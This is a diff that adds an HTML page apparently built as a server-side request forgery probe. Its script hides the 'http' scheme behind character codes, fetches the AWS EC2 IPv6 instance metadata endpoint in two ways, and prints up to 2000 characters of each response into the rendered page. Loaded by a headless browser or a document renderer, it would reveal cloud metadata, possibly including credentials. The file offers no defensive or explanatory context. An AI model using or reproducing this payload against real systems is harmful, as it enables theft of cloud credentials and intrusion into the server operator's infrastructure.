@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>P3 Fetch</title></head>
+<body>
+<h1>FETCH_API_TEST</h1>
+<div id="r1">FETCH_LOADING</div>
+<script>
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + '://[fd00:ec2::254]/latest/meta-data/';
+
+// Method 1: fetch() with blocking pattern
+(async function() {
+  try {
+    var resp = await fetch(url, {mode: 'no-cors'});
+    var text = await resp.text();
+    document.getElementById('r1').innerText = 'FETCH_OK:' + resp.status + ' BODY:' + text.substr(0,2000);
+  } catch(e) {
+    document.getElementById('r1').innerText = 'FETCH_ERR:' + e.message;
+  }
+
+  // Method 2: fetch with cors mode
+  try {
+    var resp2 = await fetch(url);
+    var text2 = await resp2.text();
+    document.body.insertAdjacentHTML('beforeend', '<div>FETCH_CORS:' + resp2.status + ' ' + text2.substr(0,2000) + '</div>');
+  } catch(e) {
+    document.body.insertAdjacentHTML('beforeend', '<div>FETCH_CORS_ERR:' + e.message + '</div>');
+  }
+})();
+</script>
+</body>
+</html>
